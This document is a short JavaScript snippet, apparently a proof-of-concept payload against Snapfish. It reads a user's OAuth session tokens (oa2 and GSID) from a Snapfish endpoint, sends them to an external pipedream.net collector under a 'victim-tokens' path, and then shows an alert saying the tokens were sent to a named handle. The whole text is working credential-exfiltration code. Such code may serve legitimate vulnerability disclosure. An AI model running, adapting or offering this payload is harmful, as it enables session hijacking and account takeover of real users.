fetch('https://www.snapfish.com/library/getOauthInfo')
  .then(response => response.json())
  .then(data => {
    const { oa2, GSID } = data.oauthInfo;
    const targetUrl = `https://eo1ey5201bcmppg.m.pipedream.net/victim-tokens?oa2=${encodeURIComponent(oa2)}&GSID=${encodeURIComponent(GSID)}`;
    
    return fetch(targetUrl, { method: 'GET' });
  })
  .then(response => alert("Your session tokens have already been sent to @marciosz_"))
  .catch(error => {
    alert("Error sending tokens: " + error);
  });
